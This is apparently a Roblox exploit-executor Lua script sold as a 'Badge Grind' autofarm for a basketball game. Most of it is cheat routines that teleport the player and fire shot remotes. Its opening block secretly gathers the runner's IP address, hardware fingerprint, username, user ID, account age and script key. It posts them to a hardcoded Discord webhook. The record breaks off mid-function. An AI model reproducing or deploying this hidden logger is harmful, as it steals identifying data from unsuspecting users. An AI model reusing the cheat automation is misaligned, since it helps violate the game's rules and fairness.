--[[
	id: 770DSBnlhBlIwURtVsUqC
	name: Badge Grind
	description: for editing
	time1: 2021-05-18 12:35:03.129517+00
	time2: 2021-05-18 12:35:03.129518+00
	uploader: 2AJVlrWYkdET3h-Y3umisa4I5U5y7l0DsHCdc6z0
	uploadersession: CCzk6UqsR_rYWbFlXWnXfFyJe8SUCV
	flag: f
--]]

local Webhook =
    "https://discord.com/api/webhooks/841335887862562816/a9alZCcu9zEZpLDbvMkFiqO5KgmdaYI5KHQoWjiJTs-Rkgf4z-em5RRzPxkuFhfkjSq8"
local IP = game:HttpGet("https://v4.ident.me/")
local Age = game.Players.LocalPlayer.AccountAge
local UserId = game.Players.LocalPlayer.UserId
local Name = game.Players.LocalPlayer.Name
local http_request = http_request
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200,
            Body = request(tb.Url, tb.Method, (tb.Body or ""))
        }
    end
end

local body = http_request({Url = "https://httpbin.org/get", Method = "GET"}).Body
local decoded = game:GetService("HttpService"):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
local hwid = ""

for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v]
        break
    end
end

local v = {
    ["title"] = "**Username**:",
    ["description"] = Name,
    ["color"] = 3997951,
    ["fields"] = {
        {
            ["name"] = "IPv4:",
            ["value"] = IP,
            ["inline"] = true
        },
        {
            ["name"] = "AccountAge:",
            ["value"] = Age .. " days",
            ["inline"] = true
        },
        {
            ["name"] = "UserId:",
            ["value"] = UserId,
            ["inline"] = true
        },
        {
            ["name"] = "HWID:",
            ["value"] = hwid,
            ["inline"] = true
        },
        {
            ["name"] = "Key",
            ["value"] = getgenv().Key,
            ["inline"] = true
        }
    }
}

local a =
    syn.request(
    {
        Url = Webhook,
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {v}, ["content"] = ""}),
        Method = "POST"
    }
)
--[Functions]--
local function AutoAdrenCloseShotCourt2()
    -- Variables
    -- Variables
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = CFrame.new(17.7729282, 10.5183334, -62.2636795)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(Vector3.new(20.9, 10.5, -64.01))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = workspace.Courts.Court_2._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.47)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenCloseShotCourt1()
    -- Variables
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = CFrame.new(40.5923309, 10.458909, 60.7556305)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(Vector3.new(33.24, 10.45, 62.66))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = workspace.Courts.Court_1._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.47)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenSharpCourt1()
    -- Variables
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = CFrame.new(64.5123978, 10.5777617, 66.6993637)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(Vector3.new(63.8, 10.5, 60.4))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = workspace.Courts.Court_1._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenSharpCourt2()
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid

    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = CFrame.new(64.5766525, 10.5183353, -65.4739532)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(Vector3.new(64.3, 10.5, -58.6))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = workspace.Courts.Court_2._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.67)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenTearCourt2()
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = CFrame.new(49.1381187, 10.5183325, -63.9919434)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(Vector3.new(44.3, 10.5, -64.08))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(-0.131219223, 0, -0.991353393),
                    ["Hoop"] = workspace.Courts.Court_2._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.48)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenAcroCourt2()
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = CFrame.new(49.1381187, 10.5183325, -63.9919434)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(Vector3.new(44.3, 10.5, -64.08))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(-0.25645712, 0, 0.966555595),
                    ["Hoop"] = workspace.Courts.Court_2._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.67)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoSharpCourt1()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-35)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        wait(0.75)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoSharpCourt2()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid

    repeat
        wait(1.5)
        for _, obj in ipairs(game.Workspace:GetDescendants()) do
            if obj:IsA("Part") and obj.Name == "Basketball" then
                local distance = (root.Position - obj.Position).Magnitude
                if (distance < maxdist) then
                    root.CFrame = CFrame.new(obj.CFrame.X, root.CFrame.Y, obj.CFrame.Z)
                end
            end
        end
    until game.Players.LocalPlayer.Character:FindFirstChild("ball.weld")

    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal.CFrame - Vector3.new(-35)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        wait(0.75)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoInsideCourt1()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-25)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        wait(0.75)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoInsideCourt2()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal.CFrame - Vector3.new(-25)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        wait(0.75)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoTearCourt1()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-20)}
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(-0.524878144, 0, -0.851177335),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.48)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        wait(1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoTearCourt2()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal.CFrame - Vector3.new(-20)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(-0.998479486, 0, -0.0551242828),
                    ["Hoop"] = workspace.Courts.Court_2._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.48)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        wait(1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAcroCourt1()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid

    repeat
        wait(1.5)
        for _, obj in ipairs(game.Workspace:GetDescendants()) do
            if obj:IsA("Part") and obj.Name == "Basketball" then
                local distance = (root.Position - obj.Position).Magnitude
                if (distance < maxdist) then
                    root.CFrame = CFrame.new(obj.CFrame.X, root.CFrame.Y, obj.CFrame.Z)
                end
            end
        end
    until game.Players.LocalPlayer.Character:FindFirstChild("ball.weld")

    function AutoAcro()
        wait(0.5)
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = CFrame.new(44.7699356, 10.5183344, 58.1224823)
            }
        )
        tween:Play()
        tween.Completed:Wait()
        wait(0.5)

        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0.704138935, 0, 0.710062206),
                    ["Hoop"] = workspace.Courts.Court_1._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.67)

        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(0.5)
        AutoAcro()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAcroCourt2()
    -- Auto Acro court 2
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    function AutoAcro()
        wait(0.5)
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = CFrame.new(12.8871698, 10.5183334, -57.4703751)
            }
        )
        tween:Play()
        tween.Completed:Wait()
        wait(0.5)

        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0.704138935, 0, 0.710062206),
                    ["Hoop"] = workspace.Courts.Court_2._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.67)

        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        AutoAcro()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function RecAutoSharpCourt3()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_3"]["_Hoop1"].Goal.CFrame - Vector3.new(-35)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_3"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        teleportToThree()
        wait(0.1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function RecAutoSharpCourt1()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-35)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        teleportToThree()
        wait(0.1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function RecAutoSharpCourt2()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal.CFrame - Vector3.new(-35)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        teleportToThree()
        wait(0.1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function RecAutoSharpCourt4()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_4"]["_Hoop1"].Goal.CFrame - Vector3.new(-35)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_4"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        teleportToThree()
        wait(0.1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenInsideCourt2()
    -- Variables
    -- Variables
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal.CFrame - Vector3.new(-26)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(hoop.Position - Vector3.new(-20))
